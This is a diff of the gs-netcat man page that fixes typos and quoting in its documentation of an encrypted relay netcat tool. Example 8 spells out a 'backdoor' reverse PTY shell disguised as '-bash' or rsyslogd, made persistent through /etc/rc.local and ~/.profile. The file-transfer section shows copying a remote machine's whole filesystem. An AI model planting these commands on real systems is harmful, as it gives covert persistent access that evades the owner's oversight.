@@ -54,14 +54,13 @@ Execute command and send output to the connected client. Needs -l.
 .It Fl g
 Generate a secure random password and output it to standard output.
 .It Fl i
-Interactive login shell. The server spawns a true PTY login shell. The client acts as a true PTY client (with Ctrl-C etc working). The client can terminate the session by typing \'Ctrl-e q\' at any time or by typing \'exit\'. The server supports multiple clients at the same time.
-
+Interactive login shell. The server spawns a true PTY login shell. The client acts as a true PTY client (with Ctrl-C etc working). The client can terminate the session by typing 'Ctrl-e q' at any time or by typing 'exit'. The server supports multiple clients at the same time.
 .It Fl k Ar file
 A file containing the password.
 .It Fl l
 Server/Listening mode. The default mode is client.
 .It Fl L Ar file
-Log file [defaut: standard out]
+Log file [default: standard out]
 .It Fl p Ar port
 Port to listen on or to forward traffic to [1-65535].
 .It Fl q
@@ -83,11 +82,10 @@ Use UDP instead of TCP for port forwarding. Needs -p.
 .It Fl w
 Client to wait for the listening server to become available.
 .El
-
 .Sh CONSOLE
 The interactive login shell (
 .Ar -i
-) has a command console. Pressing \'Ctrl-e c\' (e for EEEElite) opens the command console. The command console displays the following information:
+) has a command console. Pressing 'Ctrl-e c' (e for EEEElite) opens the command console. The command console displays the following information:
 .Pp
 .Bl -bullet -offset indent -compact
 .It
@@ -99,42 +97,29 @@ Data throughput
 .It
 File transfer logs
 .El
-Type \'help\' for a list of available commands.
-
+Type 'help' for a list of available commands.
 .Sh FILETRANSFER
-File transfer is available from the command console. Files are transfered with the permission and modification timestamp unchanged. Partially transfered files are re-started where the transfer was left off.
-
+File transfer is available from the command console. Files are transferred with the permission and modification timestamp unchanged. Partially transferred files are re-started where the transfer was left off.
 The 'put' command is used for uploading:
-
 .Dl put foobar.txt
 .Dl put $HOME/foobar.txt
 .Dl put /tmp/*.log
 .Dl put $(find . -type f -name '*.c')
-
 (The above example shows Shell Variable substitution and word expansion)
-
 It is possible to limit the amount of path information that is sent as implied directories for each path you specify. You can insert a dot and a slash into the source path, like this:
-
 .Dl put /foo/./bar/baz.c
-
 That would create /tmp/bar/baz.c on the remote machine. 
-
 The 'get' command is used for downloading:
-
 .Dl get foobar.txt
 .Dl get $(find /var/./ -name '*.log')
-
-Transfering a directory automatically transfers all files and directories within that directory (recursively):
-
+Transferring a directory automatically transfers all files and directories within that directory (recursively):
 .Dl get /var/log
 .Dl get /
 The first command transfers all directories and files in /var/log/*. The latter command transfers the entire filesystem.
-
 Multiple get/put commands can be scheduled at the same time.
-
 .Sh EXAMPLES
 .Nm Example 1
-- Listen for a new connection using the password \'MySecret\':
+- Listen for a new connection using the password 'MySecret':
 .Dl $ gs-netcat -s MySecret -l
 .Pp
 Connect with client using the same password:
@@ -144,12 +129,12 @@ Connect with client using the same password:
 - spawn a PTY login shell when a client connects:
 .Dl $ gs-netcat -s MySecret -l -i
 .Pp
-Log in to server\'s interactive shell:
+Log in to server's interactive shell:
 .Dl $ gs-netcat -s MySecret -i
 .Pp
 .Nm Example 3
 - Execute a command when a client connects:
-.Dl $ gs-netcat -s MySecret -l -e \'echo hello world; id; exit\'
+.Dl $ gs-netcat -s MySecret -l -e 'echo hello world; id; exit'
 .Pp
 Connect client to the server:
 .Dl $ gs-netcat -s MySecret
@@ -158,14 +143,14 @@ Connect client to the server:
 - Pipe data from client to server:
 .Dl $ gs-netcat -s MySecret -l -r >warez.tar.gz
 .Pp
-Client to read \'warez.tar.gz\' and pipe it to the server.
+Client to read 'warez.tar.gz' and pipe it to the server.
 .Dl $ gs-netcat -s MySecret <warez.tar.gz
 .Pp
 .Nm Example 5
 - Server to act as a SOCKS4/4a/5 server:
 .Dl $ gs-netcat -s MySecret -l -S
 .Pp
-Client to listen on TCP port 1080 and forward any new connection to the server\'s SOCKS server:
+Client to listen on TCP port 1080 and forward any new connection to the server's SOCKS server:
 .Dl $ gs-netcat -s MySecret -p 1080
 .Pp
 .Nm Example 6
@@ -177,35 +162,33 @@ Client to listen on TCP port 2222 and forward any new connection to the the serv
 .Dl $ ssh -p 2222 root@127.0.0.1
 .Pp
 The same using 1 command:
-.Dl $ ssh -o ProxyCommand=\'gs-netcat -s MySecret\' root@ignored
+.Dl $ ssh -o ProxyCommand='gs-netcat -s MySecret' root@ignored
 .Pp
 .Nm Example 7
 - Creating an SFTP server using gs-netcat:
 .Dl $ gs-netcat -s MySecret -l -e /usr/lib/sftp-server
 .Pp
 The sftp-server binary speaks the sftp-protocol to stdin/stdout. The sftp binary also speaks sftp-protocol to stdin/stdout. The tool can be used to connect both via GSRN (encrypted) and access the SFTP server running on the server's side from the client via the GSRN (encrypted).:
-.Dl $ export GSOCKET_ARGS=\'-s MySecret\'
+.Dl $ export GSOCKET_ARGS='-s MySecret'
 .Dl $ sftp -D gs-netcat
 .Pp
 .Nm Example 8
-- Encrypted Reverse PTY shell hidden as \'-bash\' in the process list - also known as \'backdoor\':
+- Encrypted Reverse PTY shell hidden as '-bash' in the process list - also known as 'backdoor':
 .Dl $ (GSOCKET_ARGS="-s MySecret -liqD" exec -a -bash gs-netcat)
 .Pp
 The following line in /etc/rc.local starts the backdoor after each system reboot:
 .Dl GSOCKET_ARGS="-s MySecret -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c\ "cd $HOME; exec -a rsyslogd /usr/local/bin/gs-netcat"
 .Pp
-The follwing line in /etc/rc.local starts a port-forward to 127.0.0.1:22:
+The following line in /etc/rc.local starts a port-forward to 127.0.0.1:22:
 .Dl GSOCKET_ARGS="-k MySecret2 -lqD -d 127.1 -p22"  /bin/bash -c\ "exec -a rsyslogd /usr/local/bin/gs-netcat"
 .Pp
-The following line in the user\'s ~/.profile starts the backdoor (once) when the user logs in. All in one line:
+The following line in the user's ~/.profile starts the backdoor (once) when the user logs in. All in one line:
 .Dl killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret3 -liqD" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)
 .Pp
-The \'(...)\' brackets start a sub-shell which is then replaced (by exec) with the gs-netcat process. The process is hidden (as -bash) from the process list.
+The '(...)' brackets start a sub-shell which is then replaced (by exec) with the gs-netcat process. The process is hidden (as -bash) from the process list.
 .Pp
 Client to connect to the backdoor:
 .Dl $ gs-netcat -s MySecret -i
-
-
 .Sh ENVIRONMENT
 The following environment variables can be set to control the behavior of
 .Nm
@@ -218,7 +201,6 @@ The following environment variables can be set to control the behavior of
 .Pp
 .Nm GSOCKET_ARGS
 .Dl A string containing additional command line parameters. First the normal command line parameters are processed and then the command line parameters from GSOCKET_ARGS.
-
 .Sh SECURITY
 Passing the password as command line parameter is not secure. Consider using the -k option or GSOCKET_ARGS or enter the password when prompted:
 .Pp
@@ -231,13 +213,13 @@ Passing the password as command line parameter is not secure. Consider using the
 The security is end-2-end. This means from User-2-User (and not just to the GSRN). The GSRN relays only (encrypted) data to and from the users.
 .Pp
 .Nm 2.
-The session is 256 bit and ephemeral. It is freshly generated for every session and generated randomly (and is not based on the password). It uses OpenSSL\'s SRP with AES-256 and a 4096 Prime.
+The session is 256 bit and ephemeral. It is freshly generated for every session and generated randomly (and is not based on the password). It uses OpenSSL's SRP with AES-256 and a 4096 Prime.
 .Pp
 .Nm 3.
-The password can be \'weak\' without weakening the security of the session. A brute force attack against a weak password requires a new TCP connection for every guess.
+The password can be 'weak' without weakening the security of the session. A brute force attack against a weak password requires a new TCP connection for every guess.
 .Pp
 .Nm 4.
-Do not use stupid passwords like \'password123\'. Malice might pick the same (stupid) password by chance and connect. If in doubt use gs-netcat -g to generate a strong one. Alice\'s and Bob\'s password should at least be strong enough so that Malice can not guess it by chance while Alice is waiting for Bob to connect.
+Do not use stupid passwords like 'password123'. Malice might pick the same (stupid) password by chance and connect. If in doubt use gs-netcat -g to generate a strong one. Alice's and Bob's password should at least be strong enough so that Malice can not guess it by chance while Alice is waiting for Bob to connect.
 .Pp
 .Nm 5.
 If Alice shares the same password with Bob and Charlie and either one of them connects then Alice can not tell if it is Bob or Charlie who connected.
@@ -247,10 +229,8 @@ Assume Alice shares the same password with Bob and Malice. When Alice stops list
 .Pp
 .Nm 7.
 SRP has Perfect Forward Secrecy. This means that past sessions can not be decrypted even if the password becomes known.
-
 .Sh NOTES
 The latest version is available from https://github.com/hackerschoice/gsocket/.
-
 .Sh SEE ALSO
 .Xr gsocket(1) ,
 .Xr gs-sftp(1) ,
@@ -258,7 +238,6 @@ The latest version is available from https://github.com/hackerschoice/gsocket/.
 .Xr blitz(1) ,
 .Xr nc(1) ,
 .Xr socat(1)
-
 .Sh BUGS
 Efforts have been made to have
 .Nm
